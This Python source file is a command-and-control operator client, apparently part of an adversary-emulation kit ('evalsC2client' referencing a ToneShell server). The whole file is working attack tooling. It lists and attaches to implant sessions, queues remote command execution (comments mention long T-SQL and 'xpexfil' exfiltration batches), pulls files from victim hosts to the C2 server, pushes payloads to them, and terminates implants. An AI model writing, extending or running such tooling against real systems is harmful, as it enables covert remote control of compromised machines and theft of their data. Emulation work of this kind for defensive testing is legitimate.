import json
import random
import time

import requests
from datetime import datetime, timedelta

from constants import (
    API_RESP_TYPE_KEY, API_RESP_STATUS_KEY, API_RESP_DATA_KEY, API_RESP_STATUS_OK,
    RESP_TYPE_SESSIONS, RESP_TYPE_TASK_INFO, RESP_TYPE_TASK_OUTPUT,
    TASK_STATUS_KEY, TASK_GUID_KEY, TASK_OUTPUT_KEY,
    TASK_STATUS_FINISHED, TASK_STATUS_DISCARDED,
    TS_FILE_DOWNLOAD, TS_EXEC, TS_FILE_UPLOAD, TS_TERMINATE,
)


class ApiError(Exception):
    pass


class C2Client:
    """REST client for evalsC2client API — reusable base for any implant shell."""

    def __init__(self, port: str, debug: bool = False):
        self.port       = port
        self.base_url   = f"http://localhost:{port}/api/v1.0"
        self.session    = None
        self.hostname   = None
        self._task_num  = random.randint(1000, 60000)
        self.debug      = debug
        # Single operator-facing timeout knob (set via `timeout <n>` in the
        # shell): the implant wait-limit sent in every EXEC task JSON.
        # Batch pipelines routinely run minutes (stage INSERT, hex decode,
        # xpexfil INSERT), so the default is 600, not 120.
        self._timeout_s = 600

    # -- transport -----------------------------------------------------------

    def _next_task_num(self) -> int:
        n = self._task_num
        self._task_num += 1
        return n

    def _extract(self, resp: requests.Response, expected_type: int):
        d = resp.json()
        if d.get(API_RESP_STATUS_KEY) != API_RESP_STATUS_OK:
            raise ApiError(d.get(API_RESP_DATA_KEY, "unknown error"))
        if d.get(API_RESP_TYPE_KEY) != expected_type:
            raise ApiError(f"expected response type {expected_type}, got {d.get(API_RESP_TYPE_KEY)}")
        return d[API_RESP_DATA_KEY]

    def _post_json(self, path: str, payload: dict) -> dict:
        if self.debug:
            print(f"[DBG] POST  -> {path}  {payload}")
        resp = requests.post(f"http://localhost:{self.port}{path}", json=payload)
        return resp.json()

    def _post_task(self, task_json: dict) -> dict:
        url  = f"{self.base_url}/session/{self.session}/task"
        body = json.dumps(task_json)
        resp = requests.post(url, body)
        return self._extract(resp, RESP_TYPE_TASK_INFO)

    def _poll_output(self, task_guid: str, timeout_s: int | None = None) -> str | None:
        """Poll a task until it reaches a terminal state (FINISHED / DISCARDED).

        No deadline by default: a task always terminates - success registers
        output (TASK_COMPLETE), failure registers "TASK ERROR ..." (server marks
        errored tasks finished). Pass timeout_s explicitly only when the caller
        wants fire-and-forget semantics (keep watching, task keeps running)."""
        url      = f"{self.base_url}/task/{task_guid}"
        deadline = datetime.now() + timedelta(seconds=timeout_s) if timeout_s else None
        while deadline is None or datetime.now() < deadline:
            resp = requests.get(url)
            try:
                data   = self._extract(resp, RESP_TYPE_TASK_INFO)
                status = data[TASK_STATUS_KEY]
                if status == TASK_STATUS_FINISHED:
                    return data.get(TASK_OUTPUT_KEY, "")
                if status == TASK_STATUS_DISCARDED:
                    print("[!] task discarded by server")
                    return None
            except ApiError:
                pass
            time.sleep(2)
        print("[!] timed out waiting for output")
        return None

    # -- session management --------------------------------------------------

    def cmd_sessions(self):
        resp     = requests.get(f"{self.base_url}/sessions")
        sessions = self._extract(resp, RESP_TYPE_SESSIONS) or []
        if not sessions:
            print("  (no active sessions)")
            return
        print(f"  {'SESSION ID':<36}  HOSTNAME")
        print(f"  {'-'*36}  {'-'*24}")
        for s in sessions:
            guid     = s.get("guid", "?")
            hostname = s.get("hostName", s.get("hostname", "?"))
            marker   = " *" if guid == self.session else "  "
            print(f"{marker}{guid}  {hostname}")

    def cmd_use(self, session_id: str):
        resp     = requests.get(f"{self.base_url}/session/{session_id}")
        data     = self._extract(resp, RESP_TYPE_SESSIONS)
        if isinstance(data, list):
            data = data[0]
        self.session  = session_id
        self.hostname = data.get("hostName", data.get("hostname", session_id[:8]))
        print(f"[+] attached to {self.hostname} ({session_id})")

    def cmd_detach(self):
        print(f"[*] detached from {self.session}")
        self.session  = None
        self.hostname = None

    # -- C2 commands ---------------------------------------------------------

    def cmd_exec(self, command: str):
        task_num = self._next_task_num()
        # timeout: implant-side wait limit (exec.cpp wait_limit_ms); server reads
        # taskData["timeout"] (toneshell.go) - without this key the server sends
        # DEFAULT_TASK_TIMEOUT (120 s) and long T-SQL batches die with 0x60004.
        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command,
                    "timeout": self._timeout_s}
        info     = self._post_task(task)
        task_guid = info[TASK_GUID_KEY]
        print(f"[*] task {task_guid} queued (taskNum={task_num}), waiting ...")
        # Block until the task reaches a terminal state - the implant wait-limit
        # above is the only deadline; the task ends with output or TASK ERROR.
        output = self._poll_output(task_guid)
        if output is not None:
            print(output, end="" if output.endswith("\n") else "\n")

    def cmd_exec_raw(self, command: str, timeout_s: int = None) -> str:
        """Send EXEC task, block until terminal state, return raw output string.

        timeout_s (optional) only raises the implant wait-limit for this task
        (task JSON = max(self._timeout_s, timeout_s)); the poll itself has no
        deadline."""
        effective_wait = max(self._timeout_s, timeout_s or 0)
        if self.debug:
            print(f"[DBG] EXEC  -> {command} (wait-limit {effective_wait}s)")
        task_num = self._next_task_num()
        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command,
                    "timeout": effective_wait}
        info     = self._post_task(task)
        output   = self._poll_output(info[TASK_GUID_KEY])
        if self.debug and output:
            out_preview = output.strip()[:300] + ('...' if len(output.strip()) > 300 else '')
            print(f"[DBG] OUT   <- {out_preview}")
        return output or ""

    def cmd_get(self, remote_path: str):
        """Pull a file FROM the implant to the C2 server upload dir."""
        if self.debug:
            print(f"[DBG] GET   -> implant:{remote_path} -> C2 uploads/")
        task_num = self._next_task_num()
        task     = {"id": TS_FILE_UPLOAD, "taskNum": task_num, "args": remote_path}
        info     = self._post_task(task)
        print(f"[*] file-get task {info[TASK_GUID_KEY]} queued (implant will push {remote_path})")

    def cmd_get_wait(self, remote_path: str, dest_name: str = None, timeout_s: int = None):
        """Pull a file FROM the implant to the C2 server upload dir, block until complete."""
        if self.debug:
            print(f"[DBG] GET-W -> implant:{remote_path} -> C2 files/{dest_name or '(random)'}  (blocking)")
        task_num = self._next_task_num()
        task     = {"id": TS_FILE_UPLOAD, "taskNum": task_num, "args": remote_path}
        if dest_name:
            task["fileName"] = dest_name
        info     = self._post_task(task)
        print(f"[*] file-get task {info[TASK_GUID_KEY]} queued, waiting for upload ...")
        output = self._poll_output(info[TASK_GUID_KEY], timeout_s=timeout_s)
        if output is None:
            print(f"[!] file-get: timed out or discarded — implant:{remote_path}")
        elif output.strip():
            print(f"[+] file-get complete: {output.strip()}")
        else:
            label = dest_name or remote_path.rsplit("\\", 1)[-1]
            print(f"[+] file-get complete: C2 files/{label}")

    def cmd_put_wait(self, payload_name: str, remote_dest: str, timeout_s: int = None):
        """Push a file to the implant and block until transfer is complete."""
        if self.debug:
            print(f"[DBG] PUT-W -> payloads/{payload_name} -> implant:{remote_dest}  (blocking)")
        task_num = self._next_task_num()
        task     = {"id": TS_FILE_DOWNLOAD, "taskNum": task_num,
                    "args": remote_dest, "payload": payload_name}
        info     = self._post_task(task)
        print(f"[*] file-put task {info[TASK_GUID_KEY]} queued, waiting for transfer ...")
        output = self._poll_output(info[TASK_GUID_KEY], timeout_s=timeout_s)
        if output is None:
            print(f"[!] file-put: timed out or discarded — implant:{remote_dest}")
        elif output.strip():
            print(f"[+] file-put complete: {output.strip()}")
        else:
            print(f"[+] file-put complete: implant:{remote_dest}")

    def cmd_put(self, payload_name: str, remote_dest: str):
        """Push a file FROM the C2 server payloads dir TO the implant."""
        if self.debug:
            print(f"[DBG] PUT   -> payloads/{payload_name} -> implant:{remote_dest}")
        task_num = self._next_task_num()
        task     = {"id": TS_FILE_DOWNLOAD, "taskNum": task_num,
                    "args": remote_dest, "payload": payload_name}
        info     = self._post_task(task)
        print(f"[*] file-put task {info[TASK_GUID_KEY]} queued "
              f"(server/{payload_name} -> implant:{remote_dest})")

    def cmd_kill(self):
        confirm = input("[!] send TERMINATE to implant? [y/N] ").strip().lower()
        if confirm != "y":
            print("[*] aborted")
            return
        task     = {"id": TS_TERMINATE}
        body     = json.dumps(task)
        url      = f"{self.base_url}/session/{self.session}/task"
        resp     = requests.post(url, body)
        print("[+] TERMINATE sent" if resp.ok else f"[-] {resp.text}")

    def cmd_output(self):
        url  = f"{self.base_url}/session/{self.session}/task/output"
        resp = requests.get(url)
        data = self._extract(resp, RESP_TYPE_TASK_OUTPUT)
        print(data or "(no output)")
